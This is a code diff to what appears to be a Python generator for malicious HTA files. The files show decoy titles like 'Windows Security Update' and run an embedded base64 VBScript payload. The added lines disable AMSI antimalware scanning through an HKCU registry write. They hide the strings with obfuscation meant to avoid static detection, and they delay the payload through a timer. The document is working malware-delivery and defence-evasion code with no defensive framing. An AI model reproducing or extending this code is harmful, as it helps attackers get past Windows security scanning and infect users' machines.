@@ -107,6 +107,22 @@ def _build_hta(runner_b64: str) -> str:
     vbs = _vbs_runner_body(runner_b64)
     title = random.choice(["Windows Security Update", "System Configuration",
                            "Device Management", "Windows Update"])
+
+    # AMSI registry bypass (HKCU — no admin needed, applies to Windows Script Host context).
+    # Written using the same _vbs_split obfuscation to avoid static string matches.
+    sub_name  = _rv(random.randint(4, 7)).capitalize() + _rv(random.randint(2, 4))
+    v_wsh2    = _rv()
+    amsi_key  = _vbs_split("HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable")
+    wsh_cls2  = _vbs_split("WScript.Shell")
+    reg_dword = _vbs_split("REG_DWORD")
+
+    amsi_patch = (
+        f"On Error Resume Next\n"
+        f"Dim {v_wsh2}\n"
+        f"Set {v_wsh2}=CreateObject({wsh_cls2})\n"
+        f"{v_wsh2}.RegWrite {amsi_key},0,{reg_dword}\n"
+    )
+
     return (
         "<html>\n"
         "<head>\n"
@@ -116,8 +132,12 @@ def _build_hta(runner_b64: str) -> str:
         "</head>\n"
         "<body>\n"
         "<script language='VBScript'>\n"
+        f"{amsi_patch}"
+        f"Sub {sub_name}()\n"
         f"{vbs}"
         "window.close\n"
+        f"End Sub\n"
+        f"window.setTimeout \"{sub_name}()\",250\n"
         "</script>\n"
         "</body>\n"
         "</html>\n"
